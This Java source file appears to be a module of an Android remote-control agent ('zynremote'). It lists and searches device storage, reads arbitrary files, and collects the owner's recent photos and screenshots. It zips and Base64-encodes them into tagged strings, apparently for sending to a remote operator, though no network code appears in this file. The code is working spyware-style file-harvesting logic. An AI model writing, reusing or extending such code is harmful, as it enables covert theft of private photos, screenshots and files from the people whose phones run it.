package com.zynremote.agent;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.BufferedReader;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileHelper {

    public static String listDir(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return "not found: " + path;
            if (!dir.isDirectory()) return "not a dir: " + path;
            File[] files = dir.listFiles();
            if (files == null) return "no access";
            StringBuilder sb = new StringBuilder();
            sb.append("Путь: ").append(path).append("\n\n");
            java.util.Arrays.sort(files, (a, b) -> a.getName().compareToIgnoreCase(b.getName()));
            for (File f : files) {
                sb.append(f.isDirectory() ? "DIR  " : "FILE ")
                  .append(f.getName())
                  .append(f.isDirectory() ? "" : " (" + humanSize(f.length()) + ")")
                  .append("\n");
            }
            return sb.toString();
        } catch (Throwable t) {
            return "error ls: " + t.getMessage();
        }
    }

    public static String findFiles(String pattern) {
        try {
            List<File> found = new ArrayList<>();
            File sd = Environment.getExternalStorageDirectory();
            findRecursive(sd, pattern, found, 0);
            StringBuilder sb = new StringBuilder();
            sb.append("Найдено: ").append(found.size()).append("\n\n");
            int count = 0;
            for (File f : found) {
                if (count++ > 100) break;
                sb.append(f.getAbsolutePath()).append("\n");
            }
            return sb.toString();
        } catch (Throwable t) {
            return "error find: " + t.getMessage();
        }
    }

    private static void findRecursive(File dir, String pattern, List<File> out, int depth) {
        if (dir == null || depth > 5 || out.size() > 500) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        String pat = pattern.toLowerCase().replace("*", "");
        for (File f : files) {
            if (out.size() > 500) return;
            if (f.isDirectory()) findRecursive(f, pattern, out, depth + 1);
            else if (f.getName().toLowerCase().contains(pat)) out.add(f);
        }
    }

    public static String getFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists() || !f.isFile()) return "not found: " + path;
            if (f.length() > 1024 * 1024) return "too big: " + f.length();
            BufferedReader r = new BufferedReader(new FileReader(f));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append("\n");
            r.close();
            return sb.toString();
        } catch (Throwable t) {
            return "error get: " + t.getMessage();
        }
    }

    public static String photosZip(int limit, String tag) {
        try {
            List<File> photos = new ArrayList<>();
            File sd = Environment.getExternalStorageDirectory();
            scanImages(sd, photos, 0);
            if (photos.isEmpty()) return "no photos";
            photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(bos);
            int added = 0;
            long total = 0;
            for (File p : photos) {
                if (added >= limit) break;
                if (p.length() > 5 * 1024 * 1024) continue;
                if (total + p.length() > 40 * 1024 * 1024) break;
                try {
                    FileInputStream fis = new FileInputStream(p);
                    ZipEntry e = new ZipEntry(p.getName());
                    zos.putNextEntry(e);
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
                    zos.closeEntry();
                    fis.close();
                    added++;
                    total += p.length();
                } catch (Throwable ignored) {}
            }
            zos.close();
            if (added == 0) return "no photos added";
            String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
            return "PHOTOS_ZIP|" + tag + "_" + added + ".zip|" + b64;
        } catch (Throwable t) {
            return "error zip: " + t.getMessage();
        }
    }

    public static String screenshotsZip() {
        try {
            List<File> screens = new ArrayList<>();
            File sd = Environment.getExternalStorageDirectory();
            File[] dirs = {
                new File(sd, "Pictures/Screenshots"),
                new File(sd, "DCIM/Screenshots"),
                new File(sd, "Screenshots")
            };
            for (File d : dirs) {
                if (d.exists()) scanImages(d, screens, 0);
            }
            if (screens.isEmpty()) return "no screenshots";
            screens.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ZipOutputStream zos = new ZipOutputStream(bos);
            int added = 0;
            long total = 0;
            for (File p : screens) {
                if (added >= 30) break;
                if (p.length() > 5 * 1024 * 1024) continue;
                if (total + p.length() > 40 * 1024 * 1024) break;
                try {
                    FileInputStream fis = new FileInputStream(p);
                    ZipEntry e = new ZipEntry(p.getName());
                    zos.putNextEntry(e);
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) > 0) zos.write(buf, 0, n);
                    zos.closeEntry();
                    fis.close();
                    added++;
                    total += p.length();
                } catch (Throwable ignored) {}
            }
            zos.close();
            if (added == 0) return "no screenshots added";
            String b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP);
            return "SCREENS_ZIP|screenshots_" + added + ".zip|" + b64;
        } catch (Throwable t) {
            return "error screens zip: " + t.getMessage();
        }
    }

    private static void scanImages(File dir, List<File> out, int depth) {
        if (dir == null || depth > 5 || out.size() > 2000) return;
        File[] files;
        try { files = dir.listFiles(); } catch (Throwable t) { return; }
        if (files == null) return;
        for (File f : files) {
            if (out.size() > 2000) return;
            if (f.isDirectory()) {
                String n = f.getName().toLowerCase();
                if (n.equals("android") && depth > 0) continue;
                if (n.equals("obb")) continue;
                scanImages(f, out, depth + 1);
            } else if (isImage(f.getName())) out.add(f);
        }
    }

    private static boolean isImage(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
            || l.endsWith(".webp") || l.endsWith(".gif");
    }

    public static String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return String.format("%.1f MB", bytes / 1024.0 / 1024.0);
    }
}
